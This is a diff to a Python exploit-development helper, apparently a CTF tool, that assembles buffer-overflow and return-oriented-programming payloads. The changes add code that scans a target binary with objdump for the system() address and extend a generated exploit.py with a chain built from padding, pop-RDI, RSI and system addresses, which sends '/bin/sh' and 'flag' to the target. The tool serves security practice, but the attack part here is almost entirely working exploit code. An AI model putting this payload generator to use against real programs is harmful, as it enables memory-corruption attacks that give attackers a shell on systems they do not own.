@@ -714,7 +714,7 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : FULL STACK
-# Details : Menu option selected - Set START address.
+# Details : Menu option selected - Set start address.
 # Modified: N/A
 # -------------------------------------------------------------------------------------      
       
@@ -731,7 +731,7 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : FULL STACK
-# Details : Menu option selected - Set MAN address.
+# Details : Menu option selected - Set main address.
 # Modified: N/A
 # -------------------------------------------------------------------------------------      
       
@@ -748,13 +748,13 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : FULL STACK
-# Details : Menu option selected - Set RCX value.
+# Details : Menu option selected - Set system address.
 # Modified: N/A
 # -------------------------------------------------------------------------------------      
       
    if selection =='3':
       BAK = RCX
-      RCX = input("[?] Please enter counter address: ")
+      RCX = input("[?] Please enter system address: ")
       if RCX != "":
          RCX = spacePadding(RCX,COL1)
       else:
@@ -765,13 +765,13 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : FULL STACK
-# Details : Menu option selected - Set custom address one.
+# Details : Menu option selected - Set jump address.
 # Modified: N/A
 # -------------------------------------------------------------------------------------      
       
    if selection =='4':
       BAK = JMP
-      JMP = input("[?] Please enter address to jump to: ")
+      JMP = input("[?] Please enter jump address: ")
       if JMP != "":
          JMP = spacePadding(JMP,COL1)
       else:
@@ -782,7 +782,7 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : FULL STACK
-# Details : Menu option selected - Set custom address two.
+# Details : Menu option selected - Set test address.
 # Modified: N/A
 # -------------------------------------------------------------------------------------      
       
@@ -799,13 +799,13 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : FULL STACK
-# Details : Menu option selected - Set RDI value.
+# Details : Menu option selected - Set pop RDI address.
 # Modified: N/A
 # -------------------------------------------------------------------------------------      
       
    if selection =='6':
       BAK = RDI
-      RDI = input("[?] Please enter destination address: ")
+      RDI = input("[?] Please enter pop RDI address: ")
       if RDI != "":
          RDI = spacePadding(RDI,COL1)
       else:
@@ -816,7 +816,7 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : FULL STACK
-# Details : Menu option selected - Set
+# Details : Menu option selected - Set unallocated.
 # Modified: N/A
 # -------------------------------------------------------------------------------------      
       
@@ -833,7 +833,7 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : FULL STACK
-# Details : Menu option selected - Set
+# Details : Menu option selected - Set unallocated.
 # Modified: N/A
 # -------------------------------------------------------------------------------------      
       
@@ -850,7 +850,7 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : FULL STACK
-# Details : Menu option selected - Set 
+# Details : Menu option selected - Set unallocated.
 # Modified: N/A
 # -------------------------------------------------------------------------------------      
       
@@ -907,7 +907,7 @@ while True:
       
    if selection =='12':
       BAK = RIP
-      RIP = input("[?] Please enter extended instruction pointer address: ")
+      RIP = input("[?] Please enter instruction pointer address: ")
       if RIP != "":
          RIP = spacePadding(RIP,COL1)
       else:
@@ -918,13 +918,13 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : FULL STACK
-# Details : Menu option selected - Set RSI value.
+# Details : Menu option selected - Set custom address.
 # Modified: N/A
 # -------------------------------------------------------------------------------------      
       
    if selection =='13':
       BAK = RSI
-      RSI = input("[?] Please enter source address: ")
+      RSI = input("[?] Please enter custon address: ")
       if RSI != "":
          RSI = spacePadding(RSI,COL1)
       else:
@@ -997,9 +997,19 @@ while True:
       if FIL[:7].upper() == "UNKNOWN":
          print("[-] Filename not specified...")
       else:
+         command("objdump -D " + localDir + "/" + FIL.rstrip(" ") + " > systems.tmp")
+         command("cat systems.tmp | grep system > system.tmp")
+         count = lineCount("system.tmp")
+         if count > 1:
+            cutLine(">:","system.tmp")
+         system = linecache.getline("system.tmp",1).split(":")[0]
+         system = system.strip(" ")
+         if (system[:2] != "0x") and (len(system) == 6):
+            system = "0x0000000000" + system            
+         RCX = spacePadding(system, COL1)
          command("file " + localDir + "/" + FIL.rstrip(" ") + " > file.tmp")
          command("objdump" + " -f " + localDir + "/" + FIL.rstrip(" ") + " > headers.tmp")
-         cutLine(localDir, "headers.tmp")
+         cutLine(localDir, "headers.tmp")       
          command("cat file.tmp > combined.tmp")
          command("cat headers.tmp >> combined.tmp")         
          parsFile("combined.tmp")
@@ -1792,12 +1802,12 @@ while True:
          command("echo 'padding = \"a\" * offset' >> " + localDir + "/exploit.py")
          command("echo 'terminate = \"\\\\n\"' >> " + localDir + "/exploit.py")         
          command("echo '' >> " + localDir + "/exploit.py")         
-         
          if JMP.rstrip(" ") != "0x0000000000000000":
-           switch = 1           
+            switch = 1           
          if CUS.rstrip(" ") != "0x0000000000000000":
-           switch = 2        
-         
+            switch = 2  
+         if RSI.rstrip(" ") != "0x0000000000000000":
+            switch = 3         
          command("echo 'switch = " + str(switch) + "' >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py")                    
          command("echo 'if switch == 1:' >> " + localDir + "/exploit.py")
@@ -1809,9 +1819,15 @@ while True:
          command("echo '#   print(payload)' >> " + localDir + "/exploit.py")         
          command("echo '' >> " + localDir + "/exploit.py")           
          command("echo 'if switch == 3:' >> " + localDir + "/exploit.py")
-         command("echo '   payload = flat(padding,RDI,system,jump,terminate)' >> "  + localDir + "/exploit.py")
-         command("echo '#   print(payload)' >> " + localDir + "/exploit.py")         
-         command("echo '' >> " + localDir + "/exploit.py")
+         command("echo '   payload = flat(padding,RDI,RSI,RCX,terminate)' >> "  + localDir + "/exploit.py")
+         command("echo '#   print(payload)' >> " + localDir + "/exploit.py") 
+         command("echo '   s.recvuntil(\">>\")' >> " + localDir + "/exploit.py")
+         command("echo '   s.sendline(\"hof\")' >> " + localDir + "/exploit.py")
+         command("echo '   s.recvuntil(\":\")' >> " + localDir + "/exploit.py")
+         command("echo '   s.sendline(\"/bin/sh\")' >> " + localDir + "/exploit.py")
+         command("echo '   s.recvuntil(\">>\")' >> " + localDir + "/exploit.py")
+         command("echo '   s.sendline(\"flag\")' >> " + localDir + "/exploit.py")
+         command("echo '   s.recvuntil(\":\")' >> " + localDir + "/exploit.py")         
          command("echo '' >> " + localDir + "/exploit.py")
          command("echo 's.send(payload)' >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py")
